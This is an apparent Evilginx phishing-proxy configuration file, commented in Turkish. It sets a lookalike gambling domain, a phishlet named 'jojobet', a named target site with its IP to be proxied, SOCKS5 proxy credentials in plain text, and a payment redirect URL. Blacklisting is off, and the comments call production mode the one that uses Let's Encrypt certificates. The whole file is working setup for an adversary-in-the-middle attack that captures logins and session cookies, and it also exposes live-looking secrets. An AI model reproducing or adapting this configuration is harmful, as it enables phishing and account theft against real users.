# Evilginx Configuration
# Evilginx sunucusunun kendi ayarları (lokal test)
DOMAIN=holliganbet1129.com
EXTERNAL_IPV4=127.0.0.1
BIND_IPV4=0.0.0.0
AUTOCERT=false

# NOT: aureus.com.tr (157.90.232.78) hedef sitedir
# Phishlet otomatik olarak o siteyi proxy edecek

# Application portları (evilginx'in içinde kullanacağı sabit portlar)
HTTPS_PORT=443
DNS_PORT=53
HTTP_PORT=8080

# Docker exposed portları (Host'ta erişim için, dışarıya yayınlanan portlar)
DOCKER_HTTP_PORT=8081
DOCKER_HTTPS_PORT=8444
DOCKER_DNS_PORT=5360

# PROXY
PROXY_METHOD=socks5
PROXY_HOST=216.24.215.140
PROXY_PORT=50101
PROXY_USER=balthasargelt1942
PROXY_PASS=QyHDWDbae2

# Phishlet ayarları
PHISHLET_NAME=jojobet
PHISHLET_ENABLED=true

# SSL/TLS ayarları
# DEVELOPER_MODE=true ise self-signed sertifika kullanılır (lokal test)
# DEVELOPER_MODE=false ise autocert ile Let's Encrypt kullanılır (production)
DEVELOPER_MODE=false

# Redirect URL (unauthorized kullanıcılar için)
# UNAUTH_URL=  # Boş bırakınca redirect etmeden direkt kabul eder
UNAUTH_URL=

# Blacklist modu (all, unauth, noadd, off)
BLACKLIST_MODE=off

# Debug modu
DEBUG=true

PAYMENT_REDIRECT_URL=http://lespectre1.com

